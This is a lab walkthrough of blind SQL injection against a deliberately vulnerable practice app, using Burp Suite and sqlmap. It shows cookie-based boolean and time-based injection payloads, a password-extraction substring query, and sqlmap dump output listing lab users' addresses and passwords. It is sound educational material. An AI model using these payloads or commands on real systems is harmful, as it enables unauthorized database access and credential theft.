# SQL Injection - Blind

**Credentials:**
| Username | Password |
|----------|----------|
| jeremy   | jeremy   |

- Upon successfully logging in using the provided credentials, we discovered a welcome message within the system.
  
![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/da9463ed-fda5-4ef4-97ad-2d910cb6cea5)

- After intercepting the request using Burp Suite, I successfully sent it to the Repeater tool for further analysis and manipulation.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/46289fcf-dfff-481c-92bc-fe81d950c8c6)

- During the process of sending the request through the Repeater tool, Observe the Content-Length header. The Content-Length indicates the size of the request body in bytes. Understanding the Content-Length can indeed be helpful when crafting or modifying subsequent requests, especially when dealing with different sets of credentials or payloads.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/d28f1f7a-8e88-4e6d-9c10-0fad0db1029a)

- By repeatedly passing incorrect credentials, observe the changes in the Content-Length.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/520d3924-929d-4db5-8625-53304fb8573e)

- Copy the entire request, including the request method, headers, and body. Open a text editor Create a new file in the text editor and paste the copied request into it. Save the file with an appropriate name, such as "request.txt".

- By executing the command `sqlmap -r request.txt`, I initiated an automated SQL injection testing process using the provided request.

```bash
└─$ sqlmap -r request.txt                                                                                 
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.6#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:30:10 /2023-07-15/

[06:30:10] [INFO] parsing HTTP request from 'request.txt'
[06:30:10] [INFO] testing connection to the target URL
[06:30:10] [INFO] checking if the target is protected by some kind of WAF/IPS
[06:30:10] [INFO] testing if the target URL content is stable
[06:30:10] [INFO] target URL content is stable
[06:30:10] [INFO] testing if POST parameter 'username' is dynamic
[06:30:10] [WARNING] POST parameter 'username' does not appear to be dynamic
[06:30:10] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[06:30:10] [INFO] testing for SQL injection on POST parameter 'username'
[06:30:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[06:30:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[06:30:11] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[06:30:11] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[06:30:11] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[06:30:11] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[06:30:11] [INFO] testing 'Generic inline queries'
[06:30:11] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[06:30:11] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[06:30:11] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[06:30:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[06:30:11] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[06:30:11] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[06:30:11] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[06:30:13] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[06:30:13] [WARNING] POST parameter 'username' does not seem to be injectable
[06:30:13] [INFO] testing if POST parameter 'password' is dynamic
[06:30:13] [WARNING] POST parameter 'password' does not appear to be dynamic
[06:30:13] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[06:30:13] [INFO] testing for SQL injection on POST parameter 'password'
[06:30:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[06:30:13] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[06:30:13] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[06:30:13] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[06:30:13] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[06:30:13] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[06:30:13] [INFO] testing 'Generic inline queries'
[06:30:13] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[06:30:13] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[06:30:13] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[06:30:13] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[06:30:13] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[06:30:13] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[06:30:13] [INFO] testing 'Oracle AND time-based blind'
[06:30:13] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[06:30:14] [WARNING] POST parameter 'password' does not seem to be injectable
[06:30:14] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 06:30:14 /2023-07-15/
```

- No SQL injection found. Upon further investigation in Burp Suite, we discovered a token being sent with the POST request.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/3512d294-ff25-4f09-b555-4b4369e85ed2)

- After sending the request to the repeater in Burp Suite, I carefully observed and noted the Content-Length value in the response.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/386a75b3-aff8-463e-8c74-83bd9d0907c8)

- Upon manipulating the session cookie by adding `' and 1=1#`, and observing that the response remains the same, it strongly suggests the presence of a SQL injection vulnerability within the application.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/804d6b66-a89e-4a9d-a61a-77516a6a863b)

- By crafting the payload `' and ((select version()), 1, 5) = '8.0.3'#` and receiving a positive response, it strongly indicates that the underlying SQL database is running version 8.0.3

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/c415d557-f5cb-4936-b5b0-3499636110cf)

- let's grab passwords from the DB by sending payload `' and substring(select password from injection0x02 where username = 'jessamy'), 1, 1) = 'a'#` We get an error response, to make the injection fast send the request to the intruder and send the characters for verification.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/89c4bfc1-49cc-4d8a-b3dc-0220837a52a9)

- By crafting a list of character payloads and sending them as requests, we received responses back from the target system.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/24eba318-9beb-4f7e-919c-2b5c2153daae)

- use SQLMap with the captured request and exclude the injection code, and save the request to a file named "request2.txt"

```bash
└─$ sqlmap -r request2.txt -level=2 --dump
        ___
       __H__                                                                                                                                                                                                      
 ___ ___[(]_____ ___ ___  {1.7.6#stable}                                                                                                                                                                          
|_ -| . [']     | .'| . |                                                                                                                                                                                         
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                      

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:00:35 /2023-07-15/

[10:00:35] [INFO] parsing HTTP request from 'request2.txt'
[10:00:35] [INFO] resuming back-end DBMS 'mysql' 
[10:00:35] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: session (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND 9759=9759 AND 'RaIN'='RaIN

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND (SELECT 4011 FROM (SELECT(SLEEP(5)))cqmB) AND 'cWbz'='cWbz
---
----------------------------------snip---------------------------------
Database: peh-labs
Table: idor0x01
[20 entries]
+------+--------+--------------------------------+----------+
| id   | type   | address                        | username |
+------+--------+--------------------------------+----------+
| 1000 | user   | 10, Rainbow Road, ALU 5QW      | jessamy  |
| 1001 | user   | 22, Wonderland Ave, LDN 4BD    | alice    |
| 1002 | user   | 33, Builder St, BLD 3KT        | bob      |
| 1003 | user   | 44, Chocolate Factory, CCF 2JD | charlie  |
| 1004 | user   | 55, Lister Lane, RDD 1HE       | dave     |
| 1005 | user   | 66, Hacker Road, HRK 5GT       | erin     |
| 1006 | user   | 77, Weasley Way, HGP 4RD       | fred     |
| 1007 | user   | 88, Weasley Way, HGP 4RD       | george   |
| 1008 | admin  | 99, Potter Drive, HGP 3KT      | harry    |
| 1009 | user   | 11, Lightwood Road, SHW 2EC    | isabelle |
| 1010 | admin  | 121, Sparrow Street, PRT 4BD   | jack     |
| 1011 | user   | 131, Duchess Drive, LDN 3AW    | kate     |
| 1012 | admin  | 141, Diamond Street, LDN 2RT   | lucy     |
| 1013 | user   | 151, Twain Road, USA 1MT       | mark     |
| 1014 | admin  | 161, Drew Drive, USA 2ND       | nancy    |
| 1015 | user   | 171, Twist Street, LDN 3TW     | oliver   |
| 1016 | user   | 181, Parker Place, USA 4PP     | peter    |
| 1017 | user   | 191, Quincy Quay, QQY 5QY      | quincy   |
| 1018 | user   | 202, Green Avenue, USA 6RG     | rachel   |
| 1019 | user   | 212, Rogers Road, USA 7SR      | steve    |
+------+--------+--------------------------------+----------+

Database: peh-labs
Table: auth0x02
[2 entries]
+---------+----------+----------------------------------+
| mfa     | username | password                         |
+---------+----------+----------------------------------+
| <blank> | jessamy  | pasta                            |
| <blank> | jeremy   | 66c53f8b7a7cab26545e81375726e189 |
+---------+----------+----------------------------------+
```
